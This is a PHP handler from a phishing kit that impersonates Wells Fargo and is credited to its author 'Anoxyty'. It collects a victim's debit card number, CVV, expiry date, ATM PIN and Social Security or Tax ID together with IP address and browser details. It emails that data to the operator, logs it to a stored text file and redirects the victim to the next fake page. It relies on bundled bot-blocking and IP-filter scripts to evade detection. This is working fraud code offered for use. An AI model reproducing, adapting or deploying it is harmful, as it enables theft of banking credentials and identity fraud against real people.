<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
	require 'T3R/bot.php';
	require 'T3R/usera.php';
	require 'T3R/rangip.php';
		require 'T3R/usera2.php';
	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['DebitCardNum'] ) ) {
		
		$_SESSION['DebitCardNum'] 	  = $_POST['DebitCardNum'];
		$_SESSION['cvv'] 	  = $_POST['cvv'];
		$_SESSION['ex'] 	  = $_POST['ex'];
		$_SESSION['expyr'] 	  = $_POST['expyr'];
		$_SESSION['PIN'] 	  = $_POST['PIN'];	
		$_SESSION['TaxID'] 	  = $_POST['TaxID'];

		$code = <<<EOT
============== [ WellsFargo Card | ]🔥 ==============
[CARD NUMBER] 		: {$_SESSION['DebitCardNum']}
[CVV]		: {$_SESSION['cvv']}
[Expiry Month] 		: {$_SESSION['ex']}
[Expiry Year]		: {$_SESSION['expyr']}
[ocial Security or Tax ID Number] 		: {$_SESSION['TaxID']}
[ATM]		: {$_SESSION['PIN']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 WellsFargo By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 WellsFargo Card By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: surf6.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: ardb.php?&sessionid={$_SESSION['randString']}&ue");
		exit();
	}
?>